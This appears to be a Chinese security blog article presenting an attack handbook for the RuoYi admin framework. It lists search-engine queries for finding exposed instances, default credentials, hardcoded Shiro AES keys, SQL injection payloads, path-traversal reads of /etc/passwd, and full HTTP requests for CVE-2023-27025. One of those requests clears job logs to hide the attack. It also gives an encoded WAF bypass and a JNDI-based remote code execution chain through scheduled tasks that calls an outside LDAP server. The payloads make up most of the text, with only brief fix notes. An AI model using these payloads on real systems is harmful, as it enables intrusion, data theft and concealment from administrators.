> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzkxMzMyNzMyMA==&mid=2247573270&idx=1&sn=604d3b689ad54f42bc3af950d655e5fb

#  若依(RuoYi)框架漏洞战争手册  
点击关注 👉  马哥网络安全   2025-06-16 09:01  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAk1nlByTOFiahZKGHekfZGC180aw53rHwCE1KXCFEyHULHRFVH3sTdiaibVFgTPic4UWScria3Vocb1TyQ/640?wx_fmt=png&from=appmsg "")  
  
当你在用若依时，黑客已经在用Shiro默认密钥弹你的Shell；当你还在纠结分页查询，攻击者已通过SQL注入接管数据库；而你以为安全的定时任务，不过是他们拿捏服务器的玩具。这份手册，带你用渗透的视角，解剖若依的每一处致命弱点——因为真正的安全，始于知晓如何毁灭它。  
# 0x00 前言  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicecUGKL6Q2VcpuIiaU4KkiapPo3bvwy7z8kQXWj46aRg0hU69XDHqXH1g/640?wx_fmt=png&from=appmsg "")  
## 简介  
  
Ruoyi（若依）是一款基于Spring Boot和Vue.js开发的快速开发平台。它提供了许多常见的后台管理系统所需的功能和组件，包括权限管理、定时任务、代码生成、日志管理等。Ruoyi的目标是帮助开发者快速搭建后台管理系统，提高开发效率。  
  
若依有很多版本，其中使用最多的是Ruoyi单应用版本（RuoYi），Ruoyi前后端分离版本（RuoYi-Vue），Ruoyi微服务版本（RuoYi-Cloud），Ruoyi移动版本（RuoYi-App）。  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3Ndvoicc4icOxXrfGasKOyibD6FyF6aTZHq4YhtWT8YADkMPWaIaJicApgYl6RWQ/640?wx_fmt=png&from=appmsg "")  
## 配合ruoyi的服务：  

```
alibaba druid          
alibaba nacos          
spring            
redis            
mysql            
minio            
fastjson            
shiro            
swagger-ui.html          
mybatis

```

## 搜索语法  
  
FOFA：  

```
(icon_hash=&#34;-1231872293&#34; || icon_hash=&#34;706913071&#34;)

```

  
Hunter：  

```
web.body=&#34;若依后台管理系统&#34;

```

## 环境搭建  
  
新建文件夹，拉起ruoyi源码  

```
git clone https://gitee.com/y_project/RuoYi

```

  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3Ndvoicpic2bajIbcBjWmzp2bckRLIuSVrnWy42S7tDFEUgwbTtRL6ObWs2dBQ/640?wx_fmt=png&from=appmsg "")  

```
cd RuoYi 
切换版本
git tag -l
切换
git checkout v4.5.1

```

  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicSGc50U1p8f2fSke4lrhKCJddY1HjvHYUSHKjgN0ogAAMpE4nPWLGgg/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
接下来用idea搭建的  
mysql正常用phpstudy搭建就行  
日志存放路径需要修改  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicstUhlsTAVJwTnmPkVuGibic8EDP7uLkKy7UDHgUTOLoo4YQjtNxH2Lew/640?wx_fmt=png&from=appmsg "")  
  
配置mysql  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicZZwNTOb0UA4ADmx18VDAl6I6H6PHv0gcE9I6HKZLesEMPNKfIGbsDw/640?wx_fmt=png&from=appmsg "")  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3Ndvoicr89TXlMx0s8Xh7BnvN2gdmsZTyPA3WZkchPvneFVqNqPSyHoWmrfvA/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
启动即可，默认端口80  
# 0x01 弱口令  

```
用户：admin ruoyi druid            
密码：123456 admin druid admin123 admin888

```

# 0x02 Shiro默认密钥  
## 漏洞简介  
  
若依默认使用shiro组件，所以可以试试shiro经典的rememberMe漏洞来getshell。  
## 影响版本  
  
RuoYi<V-4.6.2  
## 漏洞复现  
  
在配置文件中，能够看到shiro的密钥是在配置文件中的  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3Ndvoic7icyibCKZuSeZcQmSMMlITHsshMRTSG53quj2QzkN5lz5U1JPttD2iccQ/640?wx_fmt=png&from=appmsg "")  
  
漏洞利用工具地址  
https://github.com/SummerSec/ShiroAttack2  
- RuoYi-4.2版本使用的是shiro-1.4.2在该版本和该版本之后都需要勾选AES GCM模式。  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicWOFQsLXoy27GWRfKuYIib521r5492kDhu3fyDFRibQLj3yXib0yiahv4GA/640?wx_fmt=png&from=appmsg "")  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicyHib5kOt8AZjp5mLVyValkvI1axw6RuUtbYeUdrw0NrB1f8VSqMEiahw/640?wx_fmt=png&from=appmsg "")  
  
<table><thead><tr style="box-sizing: border-box;background-color: rgb(255, 255, 255);border-top: 1.11111px solid rgb(216, 222, 228);"><th style="box-sizing: border-box;padding: 6px 13px;text-align: left;font-weight: 600;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1.11111px;border-image: none 100% / 1 / 0 stretch;"><section style="margin-bottom: 24px;margin-top: 24px;"><span leaf="">RuoYi 版本号</span></section></th><th style="box-sizing: border-box;padding: 6px 13px;text-align: left;font-weight: 600;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1.11111px;border-image: none 100% / 1 / 0 stretch;"><section style="margin-bottom: 24px;margin-top: 24px;"><span leaf="">对象版本的默认AES密钥</span></section></th></tr></thead><tbody><tr style="box-sizing: border-box;background-color: rgb(255, 255, 255);border-top: 1.11111px solid rgb(216, 222, 228);"><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1.11111px;border-image: none 100% / 1 / 0 stretch;"><section style="margin-bottom: 24px;margin-top: 24px;"><span leaf="">4.6.1-4.3.1</span></section></td><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1.11111px;border-image: none 100% / 1 / 0 stretch;"><section style="margin-bottom: 24px;margin-top: 24px;"><span leaf="">zSyK5Kp6PZAAjlT+eeNMlg==</span></section></td></tr><tr style="box-sizing: border-box;background-color: rgb(246, 248, 250);border-top: 1.11111px solid rgb(216, 222, 228);"><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1.11111px;border-image: none 100% / 1 / 0 stretch;"><section style="margin-bottom: 24px;margin-top: 24px;"><span leaf="">3.4-及以下</span></section></td><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1.11111px;border-image: none 100% / 1 / 0 stretch;"><section style="margin-bottom: 24px;margin-top: 24px;"><span leaf="">fCq+/xW488hMTCD+cmJ3aQ==</span></section></td></tr></tbody></table>  
- RuoYi-4.6.2版本开始就使用随机密钥的方式，而不使用固定密钥，若要使用固定密钥需要开发者自己指定密钥，因此4.6.2版本以后,在没有获取到密钥的请情况下无法再进行利用。  
  
# 0x03 SQL注入  
### 注入点1 /role/list接口 （<V-4.6.2）  
  
版本同上4.5.1  
首先从源码分析一波  
Mybatis配置一般用#{}，类似PreparedStatement的占位符效果，可以防止SQL注入。RuoYi则是采用了${}造成了SQL注入  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicyIS6rRJZzdufjAuegCaicu1KBojmxibg8ptg1Jre0vt4Gtt7NwbJQUDw/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
跳转  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicaedrazeibicLR6oUQib5iboAwboQOVt8fuHC5suqskmYZkHmbAyvTzm9fQ/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
解释一下 ${params.dataScope}  
  

```
${params.dataScope}
```

  
这段代码是MyBatis的动态SQL之一，主要用于在SQL查询中嵌入外部定义的字符串或参数。这里的
```
${...}
```

  
语法表示取出
```
params
```

  
对象中名为
```
dataScope
```

  
的属性值，并将其直接嵌入到SQL语句中。  
  

```
例如，在一个基于角色权限管理的系统中，不同的用户可能有权限查看不同的数据记录。管理员可能可以查看所有部门的记录，而普通用户只能查看自己部门的记录。在这种情况下，
```

  
dataScope
```
的值可以是一个根据用户角色动态生成的SQL片段，如
```

  
"AND dept_id IN (SELECT dept_id FROM user_dept_access WHERE user_id = #{userId})"
```
，用以限定查询结果只包含特定部门的用户信息。
```

  
  
可以看到，在查询的时候，user的属性params是map，在xml中，将dataScope拼接到sql语句后  
  
进入mapper层  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicicYZPuCjZmlpx4yZuDfoPjNqj8E87r1VJUBy5ycuTdZDl3OOXAJ6rGQ/640?wx_fmt=png&from=appmsg "")  
  
跳转到上级  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicwKjYR6U8N5qR6gNSlLwCGjjPkdjrXOa6jHicL5Qwo0Lh214zhk9SMtQ/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
进入role查看信息  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicYHfqvjFzXmBTCZtuFdwicXB8iao2HMiaXXJcu8dWiazpukVTfN6f3vIyxg/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
查看功能  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3Ndvoic8ouv3BF8QB5D8VCpB0HrEkMBfzj6W10ria3rsZF5YODialwUfj6IZM1A/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
params  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicH77lGG7hslFdWibILCzZwwuxWeOfMibOIicHztIru3RicbQ5Jmup9JyZOA/640?wx_fmt=png&from=appmsg "")  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicRzUODQyB8lfEZk1MFNibdYNy2UaibOhxsFfta0lxIuPLsQiaZRicJAhjFA/640?wx_fmt=png&from=appmsg "")  
  
根据路径  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicK5Je0vCCJtsn7c6UCNEHGel19z954VwrsYz3Ificctxkxlm4Qt4A4EA/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
执行代码  

```
&params[dataScope]=and extractvalue(1,concat(0x7e,(select user()),0x7e))

```

  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3Ndvoic2U3iatpc04WAjWTmRVAeCzvtHmANZl5eD9j1OlhyTG7mSXCrE0Cppnw/640?wx_fmt=png&from=appmsg "")  
### 注入点2 /role/export （<V-4.6.2）  
### 注入点3 /user/list （<V-4.6.2）  
### 注入点4 /user/list （<V-4.6.2）  
### 注入点5 /dept/list （<V-4.6.2）  
### 注入点6 /role/authUser/allocatedList （<V-4.6.2）  
### 注入点7 /role/authUser/unallocatedList  
### 注入点8 /dept/edit （<V-4.6.2）  

```
DeptName=xxxxxxxxxxx&DeptId=100&ParentId=555&Status=0&OrderNum=1&ancestors=0)or(extractvalue(1,concat(0,(select user()))));#

```

### 注入点9 /tool/gen/createTable（V-4.7.1-V-4.7.5）  
  
参考  
https://blog.takake.com/posts/7219/#2-3-10-%E6%80%BB%E7%BB%93  
# 0x04 CNVD-2021-01931任意文件下载  
#### 漏洞简介  
  
登录后台后可以读取服务器上的任意文件。  
#### 影响版本：  
  
RuoYi<4.5.1  
#### 漏洞复现  
  
用4.5.0版本  
直接搜索关键字，download找到具体的controller  
路径  

```
/common/download/resource

```


```
/common/download/resource?resource=/profile/../../../../etc/passwd
/common/download/resource?resource=/profile/../../../../Windows/win.ini

```

  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicCmaBEH6CeYLibJoMkWiaV7n3EpB7Wa4DOib0E7S7arJHUOicqNOwZQ7REA/640?wx_fmt=png&from=appmsg "")  
# 0x05 CVE-2023-27025 若依任意文件下载  
## 漏洞简介  
  
该漏洞是若依（RuoYi）4.7.6 版本中存在的 **权限绕过 + 任意文件下载**  
 组合漏洞。攻击者通过后台管理接口添加恶意定时任务，修改系统配置文件路径，绕过下载功能的白名单限制，最终实现任意文件下载。漏洞本质是 **权限控制缺失**  
（允许低权限用户操作敏感接口）和 **路径校验不严**  
（未对动态修改的配置路径进行二次校验）的综合结果。  
## 影响版本  
- **若依（RuoYi）<= 4.7.6**  
## 利用条件  
1. **权限要求**  
：  
  
1. 攻击者需获取管理员 Cookie（如 
```
JSESSIONID
```

  
）或存在其他权限绕过漏洞。  
  
1. 若后台接口未授权即可访问，则漏洞危害升级为“未授权任意文件下载”。  
  
1. **系统配置**  
：  
  
1. 目标系统启用了定时任务模块（默认开启）。  
  
## 漏洞复现  
#### 添加任务绕过白名单（自定义下载文件路径）  

```
POST /monitor/job/add HTTP/1.1
Host: 10.40.107.67
Cookie: _tea_utm_cache_10000007=undefined; java-chains-token-key=admin_token; JSESSIONID=7c625b5d-cd39-49fd-87db-bbb64c596c1b
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-type: application/x-www-form-urlencoded
Content-Length: 214
Connection: close

createBy=admin&jobId=161&jobName=test111&jobGroup=DEFAULT&invokeTarget=ruoYiConfig.setProfile('/Users/apple/Desktop/Locks/javafx.txt')&cronExpression=0%2F10+*+*+*+*+%3F&misfirePolicy=1&concurrent=1&status=0&remark=

```

- 通过调用 
```
ruoYiConfig.setProfile()
```

  
 方法，将系统配置文件路径动态修改为攻击者指定的路径（如 
```
/Users/apple/Desktop/Locks/javafx.txt
```

  
）。  
  
- 此操作绕过了下载功能原本的“固定目录白名单”限制，将下载路径指向自定义位置。  
  
#### 执行定时任务（触发配置修改）  

```
POST /monitor/job/run HTTP/1.1
Cookie: _tea_utm_cache_10000007=undefined; java-chains-token-key=admin_token; JSESSIONID=7c625b5d-cd39-49fd-87db-bbb64c596c1b
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Host: 10.40.107.67
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-type: application/x-www-form-urlencoded
Content-Length: 9
Connection: close

jobId=117

```

- 立即执行 
```
jobId=117
```

  
 对应的定时任务，触发 
```
ruoYiConfig.setProfile()
```

  
 方法调用，完成配置文件路径的修改。  
  
- 修改后，系统将从新的配置路径（攻击者指定路径）读取文件。  
  
#### 清理任务日志（擦除攻击痕迹）  

```
POST /monitor/jobLog/clean HTTP/1.1
Cookie: _tea_utm_cache_10000007=undefined; java-chains-token-key=admin_token; JSESSIONID=7c625b5d-cd39-49fd-87db-bbb64c596c1b
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Host: 10.40.107.67
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-type: application/x-www-form-urlencoded
Content-Length: 0
Connection: close


```

- 删除任务执行日志，避免管理员发现恶意任务记录。  
  
- 此步骤非漏洞必要环节，但常用于隐蔽攻击行为。  
  
#### 触发任意文件下载  

```
GET /common/download/resource?resource=2.txt HTTP/1.1
Cookie: _tea_utm_cache_10000007=undefined; java-chains-token-key=admin_token; JSESSIONID=7c625b5d-cd39-49fd-87db-bbb64c596c1b
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Host: 10.40.107.67
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close


```

- 下载功能仅校验“配置文件中的路径”，未对动态修改后的路径进行二次白名单校验。  
  
## bypass  
  
对路径参数进行 URL 编码或 Unicode 编码，绕过 WAF 检测：  

```
invokeTarget=ruoYiConfig.setProfile('%2F%65%74%63%2F%70%61%73%73%77%64')

```

## 修复  
1. **官方补丁**  
：  
  
1. 升级若依至 **4.7.6 以上版本**  
，官方已修复权限校验和路径白名单问题。  
  
1. **代码级修复**  
：  
  
1. **权限校验**  
：对 
```
/monitor/job/add
```

  
 等后台接口添加严格的角色权限控制。  
  
1. **方法黑名单**  
：禁止 
```
invokeTarget
```

  
 参数调用敏感类方法（如 
```
ruoYiConfig.setProfile
```

  
）。  
  
1.   
1. **路径二次校验**  
：在下载功能中强制校验文件路径是否在合法白名单内。  
  
1. **临时缓解**  
：  
  
1. 禁用后台任务调度功能，或限制 
```
monitor
```

  
 模块的访问权限。  
  
1. 部署 WAF 拦截包含 
```
ruoYiConfig.setProfile
```

  
 特征的请求。  
  
# 0x06 定时任务RCE  
  
由于若依后台计划任务处，对于传入的“调用目标字符串”没有任何校验，导致攻击者可以调用任意类、方法及参数触发反射执行命令。  
## 0x01 简介  
  
RuoYi 是一个 Java EE 企业级快速开发平台，基于经典技术组合（Spring Boot、Apache Shiro、MyBatis、Thymeleaf、Bootstrap），内置模块如：部门管理、角色用户、菜单及按钮授权、数据权限、系统参数、日志管理、通知公告等。在线定时任务配置；支持集群，支持多数据源，支持分布式事务。  
## 0x02 漏洞概述  
  
若依最新后台定时任务SQL注入可导致RCE漏洞  
## 0x03 影响版本  
  
v4.7.8  
## 0x04 环境搭建  
- RuoYi 官网地址：http://ruoyi.vip(opens new window)  
  
- RuoYi 在线文档：http://doc.ruoyi.vip(opens new window)  
  
- RuoYi 源码下载：https://gitee.com/y_project/RuoYi(opens new window)  
  
使用phpstudy启动mysql  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3Ndvoiced4VbY4bbV0lOC1K0VAEHlTFrhwIDC6Wp1bkIUZA5JFs3jYTuSGQZw/640?wx_fmt=png&from=appmsg "")  
  
创建数据库
```
ry
```

  
导入sql到ry数据库中  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicT1P4ybDgCKJficl9nsHedNQf5yXPLKF4BZ04iaWvWYzaiaYP5z7yZ4PicQ/640?wx_fmt=png&from=appmsg "")  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicJooUFibQ1x0XiauF1DK4e7uPEuPag4iaeqjujDBTILqiaXWrjHCkiaMHclg/640?wx_fmt=png&from=appmsg "")  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicBib6ibQ0ONSa8j7QhDQY4g8iaAPw8z7ppAF7UgWicv1HZfRrtayGzTYoAg/640?wx_fmt=png&from=appmsg "")  
  
将ruoyi-admin下的application-druid.yml文件配置数据库账号密码  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicKFhmaFy5XGkvTiczqXk1icK4ibiaJwBwVLafmIxHxUXhAiaYMfibpl7lT4mw/640?wx_fmt=png&from=appmsg "")  
  
启动成功  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3Ndvoicr66X19HmiaIGkPW6cG6mbMcpia1ibcycFmDx7OXsvfeDO9x1RAEVvMQaQ/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
若依漏洞复现环境搭建成功  

```
admin
admin123

```

  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicNbiacFRqkqArnr51A4FEco1yxLAuLjpaFpicIbbtTHRm5gAEib6937kKA/640?wx_fmt=png&from=appmsg "")  
## 0x05 漏洞复现  
  
系统监控下定时任务中存在SQL注入漏洞  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicHOJ2Nl7a8Z74icyMqs3CahnJ95aU4o1D0iaJWCeo6j8yicRyKkhEgWGSg/640?wx_fmt=png&from=appmsg "")  
  
在补丁中，使用了黑名单和白名单的策略。  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicK5x7ibyicVcIyv3GeiaeD8kuIOicEiafFHflLsSAdeCsCAkcia0PjrqIbFyA/640?wx_fmt=png&from=appmsg "")  
  
SQL注入漏洞点  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicpjILPPqbLfFgcEJz9JlqN8NvhBSdCVYdza2me50decIljsr0q8WGJg/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
开始复现  
RCE payload  
JNDI  

```
javax.naming.InitialContext.lookup('ldap://127.0.0.1:1389/deserialJackson')

```

  
payload中可以执行反弹shell、漏洞探测、命令执行功能  
DNSLOG  

```
javax.naming.InitialContext.lookup('ldap://dnslog')

```

  
目标字符串不允许'ldap(s)'调用且不能存在括号，因此我们使用SQL注入加十六进制编码来进行绕过修改  
https://www.bejson.com/convert/ox2str/  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicODhm1nFWseX7RpeoKo30Yj6TNBib1mnEOh6tSkBiaDWa3x8ADJbnZ2SQ/640?wx_fmt=png&from=appmsg "")  

```
6a617661782e6e616d696e672e496e697469616c436f6e746578742e6c6f6f6b757028276c6461703a2f2f3132372e302e302e313a313338392f646573657269616c4a61636b736f6e2729

```

  
第一步：运行此命令  
成功地绕过了它，并成功地执行  

```
genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 'Hack By 1ue' WHERE job_id = 1;')

```

  
<table><thead><tr style="box-sizing: border-box;background-color: rgb(255, 255, 255);border-top: 1.11111px solid rgb(216, 222, 228);"><th style="box-sizing: border-box;padding: 6px 13px;text-align: left;font-weight: 600;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1.11111px;border-image: none 100% / 1 / 0 stretch;"><section style="margin-bottom: 24px;margin-top: 24px;"><span leaf=""><br/></span></section></th><th style="box-sizing: border-box;padding: 6px 13px;text-align: left;font-weight: 600;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1.11111px;border-image: none 100% / 1 / 0 stretch;"><section style="margin-bottom: 24px;margin-top: 24px;"><span leaf=""><br/></span></section></th><th style="box-sizing: border-box;padding: 6px 13px;text-align: left;font-weight: 600;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1.11111px;border-image: none 100% / 1 / 0 stretch;"><section style="margin-bottom: 24px;margin-top: 24px;"><span leaf=""><br/></span></section></th><th style="box-sizing: border-box;padding: 6px 13px;text-align: left;font-weight: 600;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1.11111px;border-image: none 100% / 1 / 0 stretch;"><section style="margin-bottom: 24px;margin-top: 24px;"><span leaf=""><br/></span></section></th><th style="box-sizing: border-box;padding: 6px 13px;text-align: left;font-weight: 600;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1.11111px;border-image: none 100% / 1 / 0 stretch;"><section style="margin-bottom: 24px;margin-top: 24px;"><span leaf=""><br/></span></section></th></tr></thead><tbody><tr style="box-sizing: border-box;background-color: rgb(255, 255, 255);border-top: 1.11111px solid rgb(216, 222, 228);"><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1.11111px;border-image: none 100% / 1 / 0 stretch;"><section style="margin-bottom: 24px;margin-top: 24px;"><span leaf="">分钟</span></section></td><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1.11111px;border-image: none 100% / 1 / 0 stretch;"><section style="margin-bottom: 24px;margin-top: 24px;"><span leaf="">小时</span></section></td><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1.11111px;border-image: none 100% / 1 / 0 stretch;"><section style="margin-bottom: 24px;margin-top: 24px;"><span leaf="">日</span></section></td><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1.11111px;border-image: none 100% / 1 / 0 stretch;"><section style="margin-bottom: 24px;margin-top: 24px;"><span leaf="">月</span></section></td><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1.11111px;border-image: none 100% / 1 / 0 stretch;"><section style="margin-bottom: 24px;margin-top: 24px;"><span leaf="">星期</span></section></td></tr></tbody></table>  

```
* * * * * ?

```

  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3Ndvoic7GfP3orjDbAI3YiaJl3SyoZmsaYsM8nvdl0jXAXxkGOnqlrFlicDujuw/640?wx_fmt=png&from=appmsg "")  
  
第二步：  
修改执行命令  

```
genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 'Hack By 1ue' WHERE job_id = 1;')

```

  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicP4PoyicuOYibat8X2atMIrGzjt9NqSVzyl7mOXS4I4cakhLC3vloBjAA/640?wx_fmt=png&from=appmsg "")  
  
第三步：  

```
genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 0x6a617661782e6e616d696e672e496e697469616c436f6e746578742e6c6f6f6b757028276c6461703a2f2f3132372e302e302e313a313338392f646573657269616c4a61636b736f6e2729 WHERE job_id = 1;')

```

  
创建任务  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3Ndvoicp84VbdDFJCa4SsegUGvUvs09ZlBPyXofPxKsGeZhB28RsEzU3upORg/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
执行一次  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicvzpBlR9rHZJeBiaBjo7FTNHNTjr0PL13ia10yChNk7V0HM39MCEWiaNIg/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
执行被修改的任务之前需要开启JNDI  
需要下载cckuailong师傅的JNDI-Injection-Exploit-Plus项目(https://github.com/cckuailong/JNDI-Injection-Exploit-Plus/releases/tag/2.3)。  
jdk版本要求1.8  

```
java -jar '.\JNDI-Injection-Exploit-Plus-2.3-SNAPSHOT-all.jar' -C calc -A 127.0.0.1

```

  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3Ndvoicib94HORgaVAmJibTvrcwaiaplxqIkcLP4eTHRkaOqbVAmJSiaWvFEaxyicw/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
执行被修改的1任务  
JNDI  

```
javax.naming.InitialContext.lookup('ldap://127.0.0.1:1389/deserialJackson')

```

  
payload中可以执行反弹shell、漏洞探测、命令执行功能  
DNSLOG  

```
javax.naming.InitialContext.lookup('ldap://dnslog')

```

  
目标字符串不允许'ldap(s)'调用且不能存在括号，因此我们使用SQL注入加十六进制编码来进行绕过修改  
https://www.bejson.com/convert/ox2str/  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicODhm1nFWseX7RpeoKo30Yj6TNBib1mnEOh6tSkBiaDWa3x8ADJbnZ2SQ/640?wx_fmt=png&from=appmsg "")  

```
0x6a617661782e6e616d696e672e496e697469616c436f6e746578742e6c6f6f6b757028276c6461703a2f2f7263793870732e646e736c6f672e636e2729

```


```
genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 0x6a617661782e6e616d696e672e496e697469616c436f6e746578742e6c6f6f6b757028276c6461703a2f2f3132372e302e302e313a313338392f646573657269616c4a61636b736f6e2729 WHERE job_id = 1;')

```

  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicXZGoOib4r8HTSbdTBqsVsFeURpKHk8NhQHtYrn3627dODeZrA3Bib4Sg/640?wx_fmt=png&from=appmsg "")  
  
我们再来试试dnslog  

```
javax.naming.InitialContext.lookup('ldap://rcy8ps.dnslog.cn')

```

  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3Ndvoicste74ZeR7yExbI8RMmWUPDuc6icf2e14bVHZuQ4V7ozISS6JeOw9Mfw/640?wx_fmt=png&from=appmsg "")  
  
